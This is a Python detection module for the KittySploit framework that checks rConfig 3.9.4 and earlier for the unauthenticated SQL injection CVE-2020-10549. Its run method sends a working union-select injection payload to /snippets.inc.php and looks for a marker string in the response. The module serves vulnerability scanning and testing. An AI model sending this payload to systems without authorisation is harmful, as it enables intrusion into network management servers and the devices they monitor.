#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rConfig 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'rConfig <=3.9.4 - SQL Injection Detection',
        'description': "rConfig 3.9.4 and prior has unauthenticated snippets.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rconfig', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/theguly/exploits/blob/master/CVE-2020-10549.py',
            'https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-10549',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-10549',
    }

    def run(self):
        r = self.http_request(method="GET", path="/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('[project-discovery]',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="rConfig <=3.9.4 - SQL Injection detected",
                path="/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains",
            )
            return True
        return False

